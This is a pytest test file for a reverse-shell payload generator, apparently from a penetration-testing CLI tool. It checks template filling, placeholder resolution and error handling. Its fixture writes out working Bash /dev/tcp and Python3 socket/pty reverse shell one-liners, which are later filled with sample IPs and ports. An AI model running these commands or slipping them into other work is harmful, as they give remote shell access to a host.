# tests/test_revshell_manager.py
import pytest
import json
from modules.managers.revshell_manager import RevshellManager
from modules.services import config, log

@pytest.fixture
def revshell_templates_file(tmp_path):
    """Creates a dummy revshell templates file and returns its path."""
    templates = {
        "bash": {
            "name": "Bash TCP",
            "template": "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        },
        "python3": {
            "name": "Python3",
            "template": "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
        }
    }
    file_path = tmp_path / "revshells.json"
    file_path.write_text(json.dumps(templates))
    return str(file_path)

@pytest.fixture
def revshell_manager(revshell_templates_file, monkeypatch):
    """Provides a RevshellManager instance with mocked dependencies."""
    # --- FIX: Patch config correctly for both revshells file and log level ---
    original_get_parameter = config.get_parameter
    def mock_get_parameter(section, key, fallback=None):
        if key == "REVSHELLS":
            return revshell_templates_file
        if key == "DEBUG_LEVEL":
            return "INFO"
        return original_get_parameter(section, key, fallback)
    monkeypatch.setattr(config, 'get_parameter', mock_get_parameter)

    # Mock the network call to get local IP
    monkeypatch.setattr("socket.socket.connect", lambda self, addr: None)
    monkeypatch.setattr("socket.socket.getsockname", lambda self: ("10.10.14.5", 12345))

    return RevshellManager()

@pytest.fixture
def mock_cli_for_revshell(mocker):
    """Provides a mock CLI instance for revshell tests."""
    cli = mocker.MagicMock()
    cli.session = mocker.MagicMock()
    cli.help_mgr = mocker.MagicMock()
    cli.console = mocker.MagicMock()
    return cli

@pytest.fixture
def mock_session(mocker):
    """Provides a mock session object for placeholder resolution."""
    session = mocker.MagicMock()
    # We don't set any profile placeholders here initially
    return session

def test_generate_with_direct_ip_port(revshell_manager, mock_session):
    """
    Tests payload generation when IP and port are provided directly.
    """
    payload = revshell_manager.generate(
        lang="bash",
        lhost="192.168.1.100",
        lport="4444",
        session=mock_session
    )
    assert payload is not None
    assert "192.168.1.100" in payload
    assert "4444" in payload
    assert "/dev/tcp/" in payload

def test_generate_with_profile_placeholders(revshell_manager, mock_session, mocker):
    """
    Tests payload generation using placeholders from the profile.
    """
    # Mock the placeholder resolver to simulate profile values
    def mock_resolve(text, session):
        if text == "$profile.lhost":
            return "10.0.2.15"
        if text == "$profile.lport":
            return "9001"
        return text # Return text as-is if it's not a placeholder we're mocking

    mocker.patch("modules.managers.revshell_manager.resolve_placeholders", side_effect=mock_resolve)

    payload = revshell_manager.generate(
        lang="python3",
        lhost=None, # Simulate user not providing an IP
        lport=None, # Simulate user not providing a port
        session=mock_session
    )
    assert payload is not None
    assert "10.0.2.15" in payload
    assert "9001" in payload
    assert "pty.spawn" in payload

def test_generate_fallback_to_auto_detect_ip_and_default_port(revshell_manager, mock_session, mocker):
    """
    Tests fallback logic: auto-detect IP and use default port when profile is not set.
    """
    # Mock the placeholder resolver to simulate no profile values being found
    def mock_resolve_fallback(text, session):
        # If it asks for a profile placeholder, return the placeholder itself
        # to simulate that it could not be resolved.
        if text.startswith("$profile"):
            return text
        return text

    mocker.patch("modules.managers.revshell_manager.resolve_placeholders", side_effect=mock_resolve_fallback)

    payload = revshell_manager.generate(
        lang="bash",
        lhost=None,
        lport=None,
        session=mock_session
    )
    assert payload is not None
    # Should fall back to the auto-detected IP from the fixture
    assert "10.10.14.5" in payload
    # Should fall back to the default port
    assert "1337" in payload

def test_generate_for_unknown_language(revshell_manager, mock_session):
    """
    Tests that generating a payload for an unknown language returns None.
    """
    payload = revshell_manager.generate(
        lang="cobol",
        lhost="1.1.1.1",
        lport="1234",
        session=mock_session
    )
    assert payload is None

def test_manager_handles_missing_or_corrupt_templates_file(monkeypatch, tmp_path):
    """
    Tests that the RevshellManager starts up gracefully even if the templates file
    is missing or contains invalid JSON.
    """
    # Case 1: File path is configured but the file does not exist.
    monkeypatch.setattr(config, 'get_parameter', lambda section, key: "/nonexistent/path.json")
    manager_missing = RevshellManager()
    # The manager should initialize with empty templates and not crash.
    assert manager_missing.templates == {}
    # Generate should return None without raising an exception.
    assert manager_missing.generate("bash", "1.1.1.1", "1234", None) is None

    # Case 2: File exists but contains corrupt JSON.
    corrupt_file = tmp_path / "corrupt.json"
    corrupt_file.write_text("{'invalid-json':,}") # Malformed JSON
    monkeypatch.setattr(config, 'get_parameter', lambda section, key: str(corrupt_file))
    manager_corrupt = RevshellManager()
    assert manager_corrupt.templates == {}
    assert manager_corrupt.generate("bash", "1.1.1.1", "1234", None) is None

def test_generate_with_target_placeholder(revshell_manager, mock_session, mocker):
    """
    Tests payload generation using a placeholder from a different entity (e.g., the target).
    """
    # Mock the placeholder resolver to simulate it returning a target's IP.
    def mock_resolve(text, session):
        if text == "$target.ip":
            return "172.17.0.5"
        return text

    mocker.patch("modules.managers.revshell_manager.resolve_placeholders", side_effect=mock_resolve)

    payload = revshell_manager.generate(
        lang="bash",
        lhost="$target.ip", # User provides a placeholder directly
        lport="8080",
        session=mock_session
    )
    assert "172.17.0.5" in payload
    assert "8080" in payload

def test_dispatch_shows_help_if_no_language(revshell_manager, mock_cli_for_revshell):
    """
    Tests that the dispatch method calls the help manager if no language is provided.
    """
    args = type('Args', (), {'language': None})()
    revshell_manager.dispatch(None, args, mock_cli_for_revshell) # Pass None for subcommand
    mock_cli_for_revshell.help_mgr.show_help_revshell.assert_called_once()